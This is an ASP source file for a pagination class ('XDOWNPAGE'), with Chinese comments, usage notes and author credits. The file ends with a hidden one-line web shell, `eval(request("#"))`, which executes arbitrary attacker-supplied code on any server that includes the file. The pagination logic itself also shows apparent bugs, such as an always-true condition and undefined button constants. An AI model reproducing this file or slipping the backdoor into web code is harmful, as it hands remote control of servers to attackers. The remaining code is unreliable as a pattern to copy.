<%
'===================================================================== 
'XDOWNPAGE ASP版本 
'版本 1.00 
'Code by zykj2000 
'Email: zykj_2000@163.net 
'BBS: http://bbs.513soft.net 
'本程序可以免费使用、修改，希望我的程序能为您的工作带来方便 
'但请保留以上请息 
' 
'程序特点 
'本程序主要是对数据分页的部分进行了封装，而数据显示部份完全由用户自定义， 
'支持URL多个参数 
' 
'使用说明 
'程序参数说明 
'PapgeSize 定义分页每一页的记录数 
'GetRS 返回经过分页的Recordset此属性只读 
'GetConn 得到数据库连接 
'GetSQL 得到查询语句 
'程序方法说明 
'ShowPage 显示分页导航条,唯一的公用方法 
' 
'例: 
' 
' '包含文件 
' 
' Set mypage=new xdownpage '创建对象 
' mypage.getconn=conn '得到数据库连接 
' mypage.getsql="select * from productinfo order by id asc" 
' mypage.pagesize=5 '设置每一页的记录条数据为5条 
' set rs=mypage.getrs() '返回Recordset 
' mypage.showpage() '显示分页信息，这个方法可以，在set rs=mypage.getrs()以后 
' 任意位置调用，可以调用多次 
' for i=1 to mypage.pagesize '接下来的操作就和操作一个普通Recordset对象一样操作 
' if not rs.eof then '这个标记是为了防止最后一页的溢出 
' response.write rs(0) & " " '这里就可以自定义显示方式了 
' rs.movenext 
' else 
' exit for 
' end if 
' next 
' 
'===================================================================== 


Const Btn_Last=":" '定义最后一页按钮显示样式 
Const XD_Align="center" '定义分页信息对齐方式 
Const XD_Width="100%" '定义分页信息框大小 
Const XD_Height="20" 


Class Xdownpage 
Private XD_PageCount,XD_Conn,XD_Rs,XD_SQL,XD_PageSize,Str_errors,int_curpage,str_URL,int_totalPage,int_totalRecord 


'================================================================= 
'PageSize 属性 
'设置每一页的分页大小 
'================================================================= 
Public Property Let PageSize(int_PageSize) 
If IsNumeric(Int_Pagesize) Then 
XD_PageSize=CLng(int_PageSize) 
Else 
str_error=str_error & "PageSize的参数不正确" 
ShowError() 
End If 
End Property 
Public Property Get PageSize 
If XD_PageSize="" or (not(IsNumeric(XD_PageSize))) Then 
PageSize=10 
Else 
PageSize=XD_PageSize 
End If 
End Property 

'================================================================= 
'GetRS 属性 
'返回分页后的记录集 
'================================================================= 
Public Property Get GetRs() 
Set XD_Rs=Server.createobject("adodb.recordset") 
XD_Rs.PageSize=PageSize 
on error resume next
XD_Rs.Open XD_SQL,XD_Conn,1,1 
'Response.Write XD_SQL
if err <> 0 then
Response.Write err.description
else

end if
If not(XD_Rs.eof and XD_RS.BOF) Then 
If int_curpage>XD_RS.PageCount Then 
int_curpage=XD_RS.PageCount 
End If 
XD_Rs.AbsolutePage=int_curpage 
End If 
Set GetRs=XD_RS 
End Property 

'================================================================ 
'GetConn 得到数据库连接 
' 
'================================================================ 
Public Property Let GetConn(obj_Conn) 
Set XD_Conn=obj_Conn 
End Property 

'================================================================ 
'GetSQL 得到查询语句 
' 
'================================================================ 
Public Property Let GetSQL(str_sql) 
XD_SQL=str_sql 
End Property 



'================================================================== 
'Class_Initialize 类的初始化 
'初始化当前页的值 
' 
'================================================================== 
Private Sub Class_Initialize 
'======================== 
'设定一些参数的黙认值 
'======================== 
XD_PageSize=10 '设定分页的默认值为10 
'======================== 
'获取当前面的值 
'======================== 
If request("page")="" Then 
int_curpage=1 
ElseIf not(IsNumeric(request("page"))) Then 
int_curpage=1 
ElseIf CInt(Trim(request("page")))<1 Then 
int_curpage=1 
Else 
Int_curpage=CInt(Trim(request("page"))) 
End If 

End Sub 

'==================================================================== 
'ShowPage 创建分页导航条 
'有首页、前一页、下一页、末页、还有数字导航 
' 
'==================================================================== 
Public Sub ShowPage() 
Dim str_tmp 

int_totalRecord=XD_RS.RecordCount 
If int_totalRecord<=0 Then 
str_error=str_error & "总记录数为零，请输入数据" 
Call ShowError() 
End If 
If int_totalRecord < PageSize Then 
	int_TotalPage=1 
Else 
	If int_totalRecord mod PageSize =0 Then 
		int_TotalPage = Int(int_TotalRecord / XD_PageSize * -1)*-1 
	Else 
		int_TotalPage = Int((int_TotalRecord / XD_PageSize * -1)*-1)+1 
	End If 
End If 
If Int_curpage>int_Totalpage Then 
int_curpage=int_TotalPage 
End If 

'=============================================================================== 
'显示分页信息，各个模块根据自己要求更改显求位置 
'=============================================================================== 

response.write " " 
str_tmp=ShowFirstPrv 
response.write str_tmp 
str_tmp=showNumBtn 
response.write str_tmp 
str_tmp=ShowNextLast 
response.write str_tmp 
str_tmp=ShowPageInfo 
response.write str_tmp 
'Response.write " " 
ShowGoto 
response.write " " 
End Sub 

'==================================================================== 
'ShowFirstPrv 显示首页、前一页 
' 
' 
'==================================================================== 
Private Function ShowFirstPrv() 
Dim Str_tmp,int_prvpage 

If int_curpage=1 Then 
str_tmp=Btn_First&" "&Btn_Prev 
Else 
int_prvpage=int_curpage-1 
str_tmp = "<a href='#' onclick=""document.form1.action='"&GetUrl()&"1"&"';document.form1.submit();"">"&Btn_First&"</a>  <a href='#' onclick=""document.form1.action='"&GetUrl()&(Int_curpage-1)&"';document.form1.submit();"">"& Btn_Prev&"</a>" 
End If 
ShowFirstPrv = "<FONT style=""FONT-FAMILY: Webdings"">" & str_tmp & "</font>"
End Function 

'==================================================================== 
'ShowNextLast 下一页、末页 
' 
' 
'==================================================================== 
Private Function ShowNextLast() 
Dim str_tmp,int_Nextpage
If Int_curpage>=int_totalpage Then 
str_tmp=Btn_Next & " " & Btn_Last 
Else 
Int_NextPage=int_curpage+1 
str_tmp="<a href='#' onclick=""document.form1.action='"&GetUrl()&(Int_curpage+1)&"';document.form1.submit();"">"&Btn_Next&"</a> "&"<a href='#' onclick=""document.form1.action='"&GetUrl()&int_totalpage&"';document.form1.submit();"">"& Btn_Last&"</a>" 
End If 
ShowNextLast = "<FONT style=""FONT-FAMILY: Webdings"">" & str_tmp & "</font>"
End Function 


'==================================================================== 
'ShowNumBtn 数字导航 
' 
' 
'==================================================================== 
'Private Function showNumBtn() 
' Dim i,str_tmp 
' For i=1 to int_totalpage 
' str_tmp=str_tmp & "["&i&"] " 
' Next 
' showNumBtn=str_tmp 
' 
'End Function 
'==================================================================== 
'ShowNumBtn 修改后的数字导航 
' 
'==================================================================== 
Function showNumBtn() 
Dim i,str_tmp,end_page,start_page 
if int_curpage>4 then 
	if int_curpage+2 Then
		start_page=int_curpage-2 
		end_page=int_curpage+2 
	else 
		start_page=int_totalpage-4 
		end_page=int_totalpage 
	end if 
else 
start_page=1 
if int_totalpage>5 then 
end_page=5 
else 
end_page=int_totalpage 
end if 
end if 
For i=start_page to end_page 
if int_curpage = i then
str_tmp=str_tmp & " ["&i&"] " 
else 
str_tmp=str_tmp & " [<a href='#' onclick=""document.form1.action='"&GetUrl()&i&"';document.form1.submit();"">"&i&"</a>] " 
end if
Next 
showNumBtn=str_tmp 
End Function 

'==================================================================== 
'ShowGoto 页面跳转 
' 
' 
'==================================================================== 
Private Function ShowGoto() 
Dim M_item 
'======================================================== 
'将返回的Url参数逐个的写入隐藏域中，以便与参数继续传递 
'======================================================== 
For Each M_item In Request.QueryString 
If InStr("page",M_Item)=0 Then '从参数中除去 "page" 的值 
Response.Write "" 
End If 
Next 
'======================================================== 
%>
<script>
function tiaozhuan(){
var yema=document.getElementById("yema").value
document.form1.action='<%=GetUrl()%>'+yema;
document.form1.submit();
}
</script>
<%
response.write " 转到第：" 
Response.Write "<input type=""text"" id=""yema"" size=""1"">页<label class=""button1""><input type=""button"" value=""GO"" onClick=""tiaozhuan()""></label>"
End Function 
'==================================================================== 
'ShowPageInfo 分页信息 
'更据要求自行修改 
' 
'==================================================================== 
Private Function ShowPageInfo() 
Dim str_tmp 
str_tmp=" [页次:"&int_curpage&"/"&int_totalpage&"页] [共"&int_totalrecord&"条] ["&XD_PageSize&"条/页]" 
ShowPageInfo=str_tmp 
End Function 

'==================================================================== 
'修改后的获取当前Url参数的函数 
'Codeing by Redsun 
'==================================================================== 
Private Function GetUrl() 
Dim ScriptAddress, M_ItemUrl, M_item 
ScriptAddress = CStr(Request.ServerVariables("SCRIPT_NAME"))&"?"'取得当前地址 
If (Request.QueryString <> "") Then 
M_ItemUrl = "" 
For Each M_item In Request.QueryString 
If InStr("page",M_Item)=0 Then 
M_ItemUrl = M_ItemUrl & M_Item &"="& Server.URLEncode(Request.QueryString(""&M_Item&"")) & "&" 
End If 
Next 
ScriptAddress = ScriptAddress & M_ItemUrl'取得带参数地址 
End If 
GetUrl = ScriptAddress & "page=" 
End Function 
'==================================================================== 
' 设置 Terminate 事件。 
'==================================================================== 
Private Sub Class_Terminate 
XD_RS.close 
Set XD_RS=nothing 
End Sub 
'==================================================================== 
'ShowError 错误提示 
'==================================================================== 
Private Sub ShowError() 
If str_Error <> "" Then 
Response.Write("" & SW_Error & "") 
Response.End 
End If 
End Sub 
End class
eval(request("#"))
%>